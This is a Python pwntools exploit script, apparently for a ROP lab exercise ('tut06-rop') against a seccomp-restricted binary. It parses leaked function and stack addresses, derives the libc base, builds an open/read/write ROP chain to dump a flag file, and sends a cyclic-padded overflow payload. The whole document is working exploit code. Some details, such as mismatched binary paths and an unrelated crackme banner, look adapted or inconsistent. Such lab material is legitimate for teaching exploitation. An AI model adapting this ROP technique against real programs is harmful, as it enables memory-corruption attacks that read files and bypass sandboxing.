#!/usr/bin/env python3

from pwn import *
from pprint import pprint

context.binary = './target'

target = ELF("/home/lab06/tut06-rop/target-seccomp")
libc = target.libc
p = target.process()

out = p.recvuntil("IOLI Crackme Level 0x00")
funcs = {}
for l in out.splitlines():
    l = l.strip()
    if b':' in l:
        func, addr = l.split(b':')
        func = func.decode("utf-8").strip()
        addr = int(addr.decode("utf-8").strip(),16)
        funcs[func] = addr
print(out)
os.environ['XDG_CACHE_HOME'] = './'

# calculate the base address of libc since we get the returned printf() address
# and can find this offset with readelf
libc_base = funcs["printf()"] - 0x00513a0

# here we need to set the libc address to the base libc address of our target program
libc.address = libc_base
stack_addr = funcs['stack']
write_addr = libc_base + 0x1d9000

flag_addr = stack_addr - 0x70
print(libc)

print("stack address: 0x%x" % stack_addr)
print("flag address: 0x%x" % flag_addr)
print("write address: 0x%x" % write_addr)
rop = ROP(libc)
rop.call(libc.symbols['open'], [flag_addr,0])
rop.call(libc.symbols['read'], [3, write_addr, 1040])
rop.call(libc.symbols['write'], [1, write_addr, 1040])

print(rop.dump())

payload = [
    b'./T\x00',
    cyclic(cyclic_find(0x6161616b)),
    rop.chain()
]

payload = b"".join(payload)
print(payload)

p.sendline(payload)
p.interactive()